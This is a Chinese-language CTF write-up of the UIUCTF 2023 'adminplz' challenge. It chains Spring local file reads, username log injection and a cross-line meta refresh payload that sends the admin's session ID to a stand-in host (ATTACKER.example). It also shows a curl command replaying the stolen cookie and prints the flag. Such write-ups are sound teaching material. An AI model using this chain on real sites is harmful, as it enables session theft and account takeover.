# UIUCTF 2023 adminplz Writeup

## 题目简述

题目是 Spring Boot 管理页面。`/admin` 根据管理员身份返回由 `view` 指定的资源；管理员机器人会先用真实密码登录，再访问用户通过 `/report` 提交的 URL。全站 CSP 为 `default-src 'none'`，常规脚本、图片和网络请求都会被阻止。

利用链由三部分组成：Spring 资源加载造成任意本地文件读取、用户名写入日志造成 HTML 注入，以及不受该 CSP 资源指令阻止的 `<meta http-equiv="refresh">` 顶层跳转。目标不是直接在日志里执行 JavaScript，而是把管理员的 `JSESSIONID` 带到攻击者服务器。

## 解题过程

### 本地文件读取与日志注入

`/admin` 的核心代码为：

```java
@GetMapping("/admin")
public Resource admin(HttpServletRequest req, HttpSession session,
                      @RequestParam String view) {
    if (isLoggedIn(session) && view.contains("flag")) {
        logger.warn("user {} [{}] attempted to access restricted view",
                    ((User) session.getAttribute("user")).getUsername(),
                    session.getId());
    }
    return app.getResource(isAdmin(req, session) ? view : "error.html");
}
```

管理员可令 `view=file:///flag.html` 读取容器根目录下的 flag，也可用：

```text
view=file:///var/log/adminplz/latest.log
```

读取当前日志。普通用户虽然只能得到 `error.html`，但只要先登录，再请求一个包含 `flag` 的 `view`，用户名和自身 session ID 就会原样进入 WARN 日志。登录逻辑仅禁止以错误密码登录用户名 `admin`，所以其他任意用户名都能创建会话，这使用户名成为日志注入点。

### 跨日志行拼接 meta refresh

CSP 会拦截 `<script>` 和外部资源，但浏览器仍可执行 HTML 的顶层刷新导航。将三条日志拼成一个未闭合的 `meta` 标签：

1. 用以下内容作为普通用户名登录，并访问 `/admin?view=flag`，写入标签开头：

   ```html
   <meta http-equiv="refresh" content="0;url=https://ATTACKER.example/leak?data=
   ```

2. 报告内部地址 `http://127.0.0.1:8080/admin?view=flag`。机器人登录后访问它，日志便写入：

   ```text
   user admin [ADMIN_JSESSIONID] attempted to access restricted view
   ```

3. 再以 `">` 作为用户名触发一条日志，闭合 `content` 属性和标签。

日志中间虽然还有固定前缀、换行和攻击者自己的 session ID，但它们都会成为跳转 URL 的一部分。攻击者收到请求后，从内容中提取位于 `user admin [...]` 后的十六进制 session ID 即可。

最后再次调用 `/report`，让管理员机器人访问：

```text
http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log
```

Spring 把日志作为资源返回，浏览器将注入内容解析成 `<meta refresh>` 并导航到攻击者服务器。题目有 5 分钟报告间隔，实际操作要等待冷却，同时留意日志达到 1 KiB 后会轮转到 `log.1.gz`。

拿到 SID 后，可直接携带管理员 cookie 读取 flag：

```bash
curl -H 'Cookie: JSESSIONID=ADMIN_JSESSIONID' \
  'https://adminplz.chal.uiuc.tf/admin?view=file:///flag.html'
```

响应为：

```text
uiuctf{adminplz_c4n_1_h4v3_s0M3_co0k13s?_b5eab1cc61c26f07e63af7f8}
```

## 方法总结

这道题要求把服务端资源解析、日志注入和浏览器导航拼成完整链条。严格 CSP 不等于没有 HTML 注入风险：当脚本和子资源均不可用时，`meta refresh`、表单或顶层导航仍可能泄露数据。日志中的 session ID 本来是敏感信息，用户名又未经转义写入同一日志；一旦日志可被浏览器按 HTML 渲染，两者就形成可利用的数据通道。
